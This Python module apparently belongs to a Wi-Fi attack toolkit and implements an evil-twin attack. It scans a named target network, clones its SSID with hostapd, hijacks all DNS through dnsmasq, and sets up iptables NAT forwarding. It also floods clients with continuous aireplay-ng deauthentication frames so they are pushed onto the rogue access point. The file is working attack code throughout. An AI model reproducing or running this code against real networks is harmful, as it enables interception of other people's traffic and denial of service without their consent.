import os
import signal
import subprocess
import time
import re
import keyboard
import glob

requirements = ['hostapd',
                'dnsmasq',
                'dhclient',
                'airmon-ng']

from terminal import (clear,
                      run_command,
                      run_command_print_output,
                      popen_command,
                      popen_command_new_terminal,
                      check_output)

from interface_management import (change_interface,
                                  is_interface_monitor,
                                  switch_interface_to_monitor_mode,
                                  switch_interface_to_managed_mode,
                                  switch_interface_channel)

from color import (red,
                   green)


def get_bssid_and_station_from_ap(interface, target_ap):

    print(f'Gathering Information on {target_ap}')
    output,error = popen_command(f'airodump-ng -N {target_ap} {interface}',killtime=2)
    if 'Failed initializing wireless card(s)' in output:
        print(f'Scan was not successful due to {green(interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        return
    elif target_ap not in output:
        print(
            f'Scan was successful but {green(target_ap)} is not found. check if its still live')
        input(print(output))
    else:
        for column in output.split('\n'):
            row = column.split()
            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6]

def create_file_in_tmp(file, content):
    """
    :param file: full name of the file to be created with extension
        ex : dnsmasq.config
    :param content: list of string
        ex : content = [
            'text',
            'text',
            'text',
            ]
    :return:
    """
    location = f'/tmp/{file}'
    with open(location, 'w') as new_file:
        for line in content:
            new_file.write(line + "\n")
    print(f'{green(file)} created at {green(location)}')


def dnsmasq(interface):
    conf_content = [
        f'interface={interface}',
        f"log-queries",
        f"log-dhcp",
        f'dhcp-range=192.168.10.1,192.168.10.250,12h',
        f'dhcp-option=3,192.168.10.1',
        f'dhcp-option=6,192.168.10.1',
        f'listen-address=127.0.0.1',
        f'server=8.8.8.8',
        f'address=/#/192.168.10.1'
    ]
    create_file_in_tmp('dnsmasq.conf', conf_content)
    popen_command_new_terminal('dnsmasq -C /tmp/dnsmasq.conf -d')


def hostapd(interface, target_ap, channel):
    conf_content = [
        f'interface={interface}',
        f'driver=nl80211',
        f'hw_mode=g',
        f'ssid={target_ap}',
        f'channel={channel}',
    ]
    create_file_in_tmp('hostapd.conf', conf_content)
    popen_command_new_terminal(f'hostapd /tmp/hostapd.conf')


def forwarding(interface, internet_facing_interface):
    run_command('airmon-ng check kill')
    switch_interface_to_monitor_mode(interface)
    run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
    run_command(f'ip addr add 192.168.10.1/24 dev {interface}')
    run_command(f'iptables -t nat -A POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command(f'iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command(f'iptables -A FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')


def rogue_ap(interface, internet_facing_interface, target_ap, channel,Called_from_EvilTwin=False):
    forwarding(interface, internet_facing_interface)
    dnsmasq(interface)
    hostapd(interface, target_ap, channel)
    if not Called_from_EvilTwin:
        input('Press Enter to Quit Rogue AP')
        close(interface, internet_facing_interface)
    if Called_from_EvilTwin:
        return

def aireplay(interface,bssid,channel):
    switch_interface_channel(interface,channel)
    popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {interface}')

def create_new_interface(interface,channel):
    """
    Issue 1
    :param interface:
    :return:
    """
    monitor_interface = interface+'clone' # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time
    output = check_output('iw dev')
    lines = output.split('\n')
    phy = '12'
    for i, line in enumerate(lines):
        if f"Interface {interface}" in line:
            phy_line = lines[i - 1]
            phy = phy_line.strip().split()[0]
            phy = phy.replace("#", "")
    run_command(f'iw {phy} interface add {monitor_interface} type monitor')
    run_command(f'ip link set {monitor_interface} up')
    return monitor_interface



def evil_twin_deauth(interface, internet_facing_interface, target_ap):
    """


    :param interface:
    :param internet_facing_interface:
    :param target_ap:
    :return:
    """
    bssid,channel = get_bssid_and_station_from_ap(interface,target_ap)
    mon = create_new_interface(interface,channel)
    aireplay(mon,bssid,channel)
    rogue_ap(interface,internet_facing_interface,target_ap,channel,Called_from_EvilTwin=True)
    input('Press Enter to Quit Evil Twin')
    close(interface, internet_facing_interface)
def close(interface, internet_facing_interface,called_from_evil_twin=False):
    if called_from_evil_twin:
        run_command('killall aireplay-ng')
    run_command('killall hostapd')
    run_command('killall dnsmasq')
    run_command(f'dhclient -r {interface}') #resets interface ip to original
    run_command("iptables --flush")
    run_command("iptables --flush -t nat")
    run_command("iptables --delete-chain")
    run_command("iptables --table nat --delete-chain")
    run_command('echo 0 > /proc/sys/net/ipv4/ip_forward')
    run_command(f'iptables -t nat -D POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command(f'iptables -D FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command(f'iptables -D FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')
    run_command(f'killall dhclient')
    run_command(f'systemctl restart NetworkManager')
